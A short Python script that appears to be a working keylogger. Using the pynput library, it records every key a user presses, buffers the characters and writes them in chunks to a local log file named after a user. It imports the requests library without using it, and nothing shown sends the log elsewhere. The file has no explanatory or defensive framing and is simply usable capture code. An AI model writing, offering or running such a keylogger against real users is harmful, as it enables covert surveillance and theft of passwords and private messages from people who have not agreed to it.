from pynput.keyboard import Key, Listener
import requests
import os

user = 'ashwin'
logFilePath = './'+user+'_log.out'
MAX_BUFFER_LEN = 30

buffer = []

def initialize():
  logFile = open(logFilePath, 'w')
  logFile.close()

def onKeyPress(key):
  if(key==Key.enter):
    buffer.append('\n')

  elif(key == Key.space):
    buffer.append(' ')

  elif(key == Key.backspace):
    if(len(buffer) == 0):
      logFile = open(logFilePath, 'a')
      if(logFile.tell() != 0):
        logFile.seek(logFile.tell() - 1, os.SEEK_SET)
        logFile.truncate()
      logFile.close()
    else:
      buffer.pop()

  elif(len(str(key)) == 3):
    buffer.append(str(key)[1])
  
  if(len(buffer) == MAX_BUFFER_LEN):
    logFile = open(logFilePath, 'a')
    data = "".join(buffer)
    logFile.write(data)
    buffer[:]=[]
    logFile.close()

if __name__ == "__main__":

  initialize()

  with Listener(on_press=onKeyPress) as listener:
    listener.join()

